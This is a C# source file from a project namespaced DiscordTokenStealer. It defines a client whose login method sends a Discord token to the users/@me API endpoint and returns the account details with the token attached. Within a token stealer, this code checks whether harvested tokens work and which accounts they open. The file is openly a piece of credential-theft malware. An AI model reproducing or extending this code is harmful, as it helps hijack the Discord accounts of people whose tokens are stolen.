using System.Text.Json;

namespace DiscordTokenStealer.Discord;

public partial class DiscordClient
{
    public async Task<DiscordUser?> LoginAsync(string token)
    {
        using var request = new HttpRequestMessage(HttpMethod.Get, "users/@me");
        request.Headers.TryAddWithoutValidation("Authorization", token);
        using var response = await _httpClient.SendAsync(request);
        if (!response.IsSuccessStatusCode)
        {
            return null;
        }
        await using var responseStream = await response.Content.ReadAsStreamAsync();
        if (await JsonSerializer.DeserializeAsync<DiscordUser>(responseStream) is not { } discordUser)
        {
            return null;
        }
        discordUser.Token = token;
        return discordUser;
    }
}

public partial class DiscordClient : IDisposable
{
    private readonly HttpClient _httpClient;

    public DiscordClient()
    {
        _httpClient = new HttpClient(new HttpClientHandler(), true)
        {
            Timeout = TimeSpan.FromSeconds(15),
            BaseAddress = new Uri("https://discordapp.com/api/")
        };
    }

    public void Dispose()
    {
        _httpClient.Dispose();
        GC.SuppressFinalize(this);
    }
}